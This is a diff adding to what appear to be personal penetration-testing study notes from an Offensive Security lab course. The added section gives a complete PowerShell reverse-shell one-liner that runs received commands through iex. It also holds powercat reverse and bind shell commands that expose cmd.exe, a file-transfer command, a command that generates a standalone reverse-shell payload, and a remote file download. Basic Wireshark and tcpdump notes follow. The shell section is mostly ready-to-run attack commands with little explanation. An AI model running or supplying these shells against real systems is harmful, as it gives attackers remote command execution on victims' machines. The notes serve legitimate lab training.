@@ -77,4 +77,93 @@ Powershell Remote File Download from Web
 
 powershell -c "(new-object system.net.webclient).downloadfile('http://10.11.0.4/wget.exe','C:\users\offsec\Desktop\wget.exe')"
 
+Powershell Reverse Shells
 
+Listener: nc -lnvp 443
+
+$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);
+  $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
+  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+ {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+ 
+ Powershell BIND Shells
+ 
+ Powercat
+ 
+ Powershell NetCat
+ 
+ . .\powercat.ps1
+ 
+ powercat -h
+ 
+ Powercat File Transfers
+ 
+ sudo nc -lnvp > receving_powercat.ps1
+ 
+ powercat -c 10.11.0.4 -p 443 -i C:\tools\powercat.ps1
+ 
+powercat reverse shells
+
+From: powercat -c 10.11.0.4 -p 443 -e cmd.exe 
+To: nc -lvp 443
+
+Powercat Bind Shells
+
+powercat -l -p 443 -e cmd.exe
+
+Powercat Standalone Payloads
+sudo nc -lnvp 443
+
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > reverseshell.ps1
+
+# Wireshark Basics
+
+## Launching Wireshark
+  sudo wireshark
+ 
+## Capture Filters
+
+##Basic Window
+  net filter 
+    net 10.11.0.1/24
+  
+  display filters   
+    tcp.port == 21
+    
+  following tcp streams
+    right click packet in GUI
+    Follow TCP Stream
+    
+# TCP Dump
+
+sudo tcpdump -r <PCAP FILE NAME>.pcap
+
+Filtering TCP Dump Traffic
+
+sudo tcpdump -n (no name resolution) -r <Filename>.pcap | awk -F" " '{print $3}' | sort | uniq -c | head
+
+Filter TCP by port
+sudo tcpdump -n (no name resolution) port 21 -r <Filename>.pcap | awk -F" " '{print $3}' | sort | uniq -c | head
+
+sudo tcpdump -nX -r filename | less
+
+Advanced Header Filtering
+
+sudo tcpdump -A -n 'tcp[13] = 24' -r password.[pcap
+
+#Bash Scripting
+
+cat hello-world.sh
+#!/bin/bash
+echo "Hello World"
+
+
+
+
+    
+
+
+ 
+
+ 
+ 
